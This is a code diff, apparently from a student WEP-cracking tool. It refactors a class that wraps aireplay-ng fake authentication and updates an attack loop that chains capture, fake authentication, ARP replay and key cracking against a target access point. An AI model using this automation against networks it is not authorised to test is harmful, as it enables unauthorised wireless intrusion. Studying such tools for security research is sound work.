@@ -35,6 +35,9 @@ import subprocess
 import tempfile
 import time
 from enum import Enum, unique
+from typing import Dict
+
+from .updatableProcess import UpdatableProcess
 
 from .common import WirelessCapturer, deauthenticate
 from .model import WirelessAccessPoint, WirelessInterface
@@ -45,7 +48,7 @@ __email__ = 'xvondr20@stud.fit.vutbr.cz'
 logger = logging.getLogger(__name__)
 
 
-class FakeAuthentication(object):
+class FakeAuthentication(UpdatableProcess):
     """
     "The  fake authentication attack allows you to perform the two types of WEP authentication (Open System and
     Shared Key) plus associate with the access point (AP). This is only useful when you need  an associated  MAC
@@ -63,155 +66,103 @@ class FakeAuthentication(object):
         """
         FakeAuthentication process states.
         """
-        ok = 0  # Authenticated and associated successfully, sending keep-alive packet.
-        new = 1  # just started
-        waiting_for_beacon_frame = 2  # 'Waiting for beacon frame'
-        terminated = 100
+        SENDING_KEEP_ALIVE = 0
+        """Authenticated and associated successfully, sending keep-alive packet."""
+        STARTED = 2
+        """Process just started."""
+        WAITING_FOR_A_BEACON_FRAME = 3
+        """Waiting for a beacon frame."""
+        TERMINATED = 100
+        """Process have been terminated. By self.stop() call, on its own or by someone else."""
 
-    def __init__(self, tmp_dir, interface: WirelessInterface, ap: WirelessAccessPoint):
+    def __init__(self, interface: WirelessInterface, ap: WirelessAccessPoint,
+                 reassoc_delay=30, keep_alive_delay=5, tries=3):
         """
+        Uses previously saved PRGA XOR, if available.
         :type interface: WirelessInterface
         :param interface: wireless interface for fake authentication
-        """
-        self.tmp_dir = tmp_dir
-        self.interface = interface  # type: WirelessInterface
-        self.ap = ap  # type: WirelessAccessPoint
 
-        self.process = None
-        self.state = None
-        self.flags = {}
-        # process' stdout, stderr for its writing
-        self.process_stdout_w = None
-        self.process_stderr_w = None
-        # process' stdout, stderr for reading
-        self.process_stdout_r = None
-        self.process_stderr_r = None
+        :type ap: WirelessAccessPoint
+        :param ap: targeted AP
 
-    def __init_flags(self):
-        """
-        Init flags describing state of the running process.
-        Should be called only during start of the process. Flags are set during update_state().
-        """
-        self.flags['deauthenticated'] = False
-        """Flag 'deauthenticated' is set if at least one deauthentication packet was received."""
-        self.flags['needs_prga_xor'] = False
-        """Flag 'needs_prga_xor' is set if PRGA XOR file is needed for shared key authentication."""
-
-    def start(self, reassoc_delay=30, keep_alive_delay=5, tries=5):
-        """
-        Start FakeAuthentication.
-        Uses previously saved PRGA XOR, if available.
         :param reassoc_delay: reassociation timing in seconds
         :param keep_alive_delay: time between keep-alive packets
         :param tries: Exit if fake authentication fails 'n' time(s)
         """
-        self.state = FakeAuthentication.State.new
-        self.__init_flags()
+        self.state = self.State.STARTED
+        self.flags = self.__initial_flags()
+
+        self.interface = interface  # type: WirelessInterface
+        self.ap = ap  # type: WirelessAccessPoint
 
         cmd = ['aireplay-ng',
                '--fakeauth', str(reassoc_delay),
                '-q', str(keep_alive_delay),
-               # '-T', str(tries),
+               '-T', str(tries),
                '-a', self.ap.bssid,
                '-h', self.interface.mac_address]
         if self.ap.prga_xor_path:
             cmd.append('-y')
             cmd.append(self.ap.prga_xor_path)
         cmd.append(self.interface.name)
-        # temp files (write, read) for stdout and stderr
-        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='fakeauth-stdout', dir=self.tmp_dir)
-        self.process_stdout_r = open(self.process_stdout_w.name, 'r')
+        super().__init__(cmd)  # start process
 
-        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='fakeauth-stderr', dir=self.tmp_dir)
-        self.process_stderr_r = open(self.process_stderr_w.name, 'r')
+    def __str__(self):
+        return '<{!s} state={!s}, flags={!s}>'.format(
+            type(self).__name__, self.state, self.flags)
 
-        # start process
-        self.process = subprocess.Popen(cmd,
-                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
-                                        universal_newlines=True)
-        logger.debug('FakeAuthentication started; ' +
-                     'stdout @ ' + self.process_stdout_w.name +
-                     ', stderr @ ' + self.process_stderr_w.name)
+    @staticmethod
+    def __initial_flags() -> Dict[str, bool]:
+        """
+        Return initial flags describing state of the running process.
+        :rtype: Dict[str, bool]
+        """
+        flags = dict()
+        flags['deauthenticated'] = False
+        """Flag 'deauthenticated' is set if at least one deauthentication packet was received."""
+        flags['needs_prga_xor'] = False
+        """Flag 'needs_prga_xor' is set if PRGA XOR file is needed for shared key authentication."""
+        return flags
 
-    def update_state(self):
+    def update(self):
         """
         Update state of running process from process' feedback.
         Read new output from stdout and stderr, check if process is alive. Set appropriate flags.
         """
+        super().update()
+        # Is process running? State would be changed after reading stdout and stderr.
+        self.poll()
+
         # check every added line in stdout
-        for line in self.process_stdout_r:
-            if 'Waiting for beacon frame' in line:
-                self.state = FakeAuthentication.State.waiting_for_beacon_frame
-            elif 'Association successful' in line:
-                self.state = FakeAuthentication.State.ok
-            elif 'Got a deauthentication packet!' in line:
-                # set flag to notify that at least one deauthentication packet was received since last update
-                self.flags['deauthenticated'] = True
-                logger.debug('FakeAuthentication received a deauthentication packet!')
-            elif 'Switching to shared key authentication' in line and not self.ap.prga_xor_path:
-                self.flags['needs_prga_xor'] = True
-                logger.debug('FakeAuthentication needs PRGA XOR.')
+        if self.stdout_r and not self.stdout_r.closed:
+            for line in self.stdout_r:
+                if 'Waiting for beacon frame' in line:
+                    self.state = self.State.WAITING_FOR_A_BEACON_FRAME
+                elif 'Association successful' in line:
+                    self.state = self.State.SENDING_KEEP_ALIVE
+                elif 'Got a deauthentication packet!' in line:
+                    # set flag to notify that at least one deauthentication packet was received since last update
+                    self.flags['deauthenticated'] = True
+                    logger.warning('FakeAuthentication received a deauthentication packet!')
+                elif 'Switching to shared key authentication' in line and not self.ap.prga_xor_path:
+                    self.flags['needs_prga_xor'] = True
+                    logger.info('FakeAuthentication needs PRGA XOR.')
 
         # check stderr
-        if self.process_stderr_r and not self.process_stderr_r.closed:
-            for line in self.process_stderr_r:  # type: str
+        if self.stderr_r and not self.stderr_r.closed:
+            for line in self.stderr_r:  # type: str
                 # NOTE: stderr should be empty
                 logger.warning("Unexpected stderr of 'aireplay-ng --fakeauth': '{}'. {}".format(line, str(self)))
 
-        # is process running?
-        if self.process and self.process.poll() is not None:
-            self.state = FakeAuthentication.State.terminated
-
-    def stop(self):
-        """
-        Stop running process.
-        If the process is stopped or already finished, exitcode is returned.
-        In the case that there was not any process, nothing happens.
-        :return:
-        """
-        if self.process:
-            exitcode = self.process.poll()
-            if exitcode is None:
-                self.process.terminate()
-                time.sleep(1)
-                self.process.kill()
-                exitcode = self.process.poll()
-                logger.debug('FakeAuthentication killed')
-
-            self.process = None
-            self.state = self.__class__.State.terminated
-            return exitcode
-
-    def clean(self):
-        """
-        Clean after running process.
-        Running process is stopped, temp files are closed and deleted,
-        :return:
-        """
-        logger.debug('FakeAuthentication clean')
-        # if the process is running, stop it and then clean
-        if self.process:
-            self.stop()
-        # close opened files
-        if self.process_stdout_r:
-            self.process_stdout_r.close()
-            self.process_stdout_r = None
-
-        if self.process_stdout_w:
-            self.process_stdout_w.close()
-            self.process_stdout_w = None
-
-        if self.process_stderr_r:
-            self.process_stderr_r.close()
-            self.process_stderr_r = None
-
-        if self.process_stderr_w:
-            self.process_stderr_w.close()
-            self.process_stderr_w = None
-
-        # remove state
-        self.state = None
-        self.flags.clear()
+        # Change state if process was not running in the time of poll() call in the beginning of this method.
+        # NOTE: Process' poll() needs to be called in the beginning of this method and returncode checked in the end
+        # to ensure all feedback (stdout and stderr) is read and states are changed accordingly.
+        # If the process exited, its state is not changed immediately. All available feedback is read and then
+        # the state is changed to self.State.TERMINATED. State, flags,stats and others can be changed during reading
+        # the available feedback even if the process exited. But self.State.TERMINATED is assigned here if
+        # the process exited.
+        if self.returncode is not None:
+            self.state = self.State.TERMINATED
 
 
 class ArpReplay(object):
@@ -612,13 +563,12 @@ class WepAttacker(object):
             capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.monitoring_interface)
             capturer.start(self.ap)
 
-            fake_authentication = FakeAuthentication(tmp_dir=tmp_dirname, interface=self.monitoring_interface,
-                                                     ap=self.ap)
-            fake_authentication.start()
+            fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
             time.sleep(1)
 
-            while fake_authentication.state != FakeAuthentication.State.ok:
-                fake_authentication.update_state()
+            # authenticate
+            while fake_authentication.state != FakeAuthentication.State.SENDING_KEEP_ALIVE:
+                fake_authentication.update()
                 logger.debug(str(fake_authentication))
                 if fake_authentication.flags['needs_prga_xor']:
                     # stop fakeauth without prga_xor
@@ -636,24 +586,31 @@ class WepAttacker(object):
                         self.ap.save_prga_xor(capturer.capturing_xor_path)
                         logger.info('PRGA XOR detected.')
                         # start fakeauth with prga_xor
-                        fake_authentication.clean()
-                        fake_authentication.start()
+                        fake_authentication.cleanup()
+                        fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
+                        time.sleep(1)
                     else:
                         logger.info('Network not detected by capturer yet.')
                 if fake_authentication.flags['deauthenticated']:
                     # wait and restart fakeauth
-                    fake_authentication.clean()
+                    fake_authentication.cleanup()
                     logger.debug('fakeauth: 5 s backoff')
                     time.sleep(5)
-                    fake_authentication.start()
+                    fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
                 time.sleep(2)
+                if fake_authentication.state == FakeAuthentication.State.TERMINATED \
+                    and not (fake_authentication.flags['needs_prga_xor']
+                             or fake_authentication.flags['deauthenticated']):
+                    logger.error('FakeAuthentication unexpectedly terminated. {}'.format(str(fake_authentication)))
+                    raise subprocess.CalledProcessError(returncode=fake_authentication.poll(),
+                                                        cmd=fake_authentication.args)
 
             arp_replay = ArpReplay(interface=self.monitoring_interface, ap=self.ap)
             arp_replay.start(source_mac=self.monitoring_interface.mac_address)
 
             # some time to create capture capturer.capturing_cap_path
             while int(capturer.get_iv_sum()) < 100:
-                fake_authentication.update_state()
+                fake_authentication.update()
                 arp_replay.update_state()
                 logger.debug('FakeAuthentication: ' + str(fake_authentication.state) + ', ' +
                              'flags: ' + str(fake_authentication.flags)
@@ -665,7 +622,7 @@ class WepAttacker(object):
             cracker.start()
 
             while not self.ap.is_cracked():
-                fake_authentication.update_state()
+                fake_authentication.update()
                 arp_replay.update_state()
                 cracker.update_state()
 
